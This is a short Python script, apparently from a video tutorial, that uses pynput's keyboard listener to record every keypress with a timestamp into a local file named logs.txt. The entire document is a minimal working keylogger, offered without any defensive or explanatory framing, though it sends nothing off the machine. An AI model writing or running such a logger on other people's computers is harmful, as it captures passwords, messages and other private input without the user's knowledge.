"""
Tutorial :https://youtu.be/BeWrD_9LXqI
"""
from pynput.keyboard import Listener
import logging

directory = "path"

logging.basicConfig(filename='{}logs.txt'.format(directory),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def key_stroke(key):
    logging.info(key)

with Listener(on_press=key_stroke) as ls:
    ls.join()


